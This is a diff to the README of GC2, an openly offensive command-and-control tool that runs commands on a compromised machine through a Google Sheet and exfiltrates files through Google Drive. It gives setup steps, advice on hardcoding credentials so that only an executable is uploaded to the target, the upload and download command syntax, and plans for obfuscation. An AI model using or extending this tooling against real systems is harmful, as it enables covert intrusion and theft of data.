@@ -1,6 +1,6 @@
 # GC2
 
-GC2 is a Command and Control application that allow an attacker to execute command on the target machine using Google Sheet.
+GC2 (Google Command and Control) is a Command and Control application that allow an attacker to execute command on the target machine using Google Sheet and exfiltrate data using Google Drive.
 
 
 # Set up
@@ -23,15 +23,17 @@ GC2 is a Command and Control application that allow an attacker to execute comma
 
 3. **Set up Google Sheet and Google Drive**
 
-    Create a new Google Sheet and add the service account to the editor of the spreadsheet
+    Create a new Google Sheet and add the service account to the editor of the spreadsheet (to add the service account use its email)
     
-    Create a new Google Drive folder and add the service account to the editor of the folder
+    Create a new Google Drive folder and add the service account to the editor of the folder (to add the service account use its email)
 
 4. **Start the C2**
 
     ```bash
     gc2-sheet --key <GCP service account credential in JSON> --sheet <Google sheet ID> --drive <Google drive ID>
     ```
+   
+   PS: you can also hardcode the parameters in the code, so you will have only the executable to upload on the target machine (look at comments in root.go and authentication.go)
 
 ## Features
 
@@ -40,9 +42,35 @@ GC2 is a Command and Control application that allow an attacker to execute comma
 - Data exfiltration using Google Drive
 
 ### Command execution
+
+The program will perform a request to the spreedsheet every 5 sec to check if there is some new command from the column "A" and will print the command result in the column "B". 
+
 ### Data exfiltration file
+
+Special commands are reserved to perform the upload and download to the target machine
+
+ ```bash
+From Target to Google Drive
+upload;<remote path>
+Example:
+ ```
+
 ### Download file
 
-#### Support the project
+Special commands are reserved to perform the upload and download to the target machine
+
+ ```bash
+ From Google Drive to Target
+download;<google drive file id>;<remote path>
+Example:
+ ```
+
+## TO DO
+
+- Test exfiltration and download with large file
+- Optimize task execution
+- Add some kind of obfuscation
+
+# Support the project
 
 **Pull request** or [![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/donate?hosted_button_id=8EWYXPED4ZU5E)
